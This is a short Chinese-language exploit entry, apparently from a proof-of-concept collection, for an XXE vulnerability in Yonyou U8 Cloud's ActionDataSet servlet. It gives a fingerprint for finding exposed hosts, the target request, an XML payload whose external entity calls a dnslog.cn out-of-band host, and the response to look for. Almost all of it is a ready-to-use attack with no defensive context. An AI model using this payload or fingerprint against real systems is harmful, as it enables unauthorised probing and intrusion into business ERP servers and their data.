# 用友U8CloudNCPortalServlet存在XXE漏洞

用友 ｜ XXE ｜ —
- **指纹**：`title="U8C"`
- **请求**：`POST /jc6/servlet/ActionDataSet HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://323232323.xxxx.dnslog.cn"> %remote;]>
```
- **响应特征**：200 Dnslog回显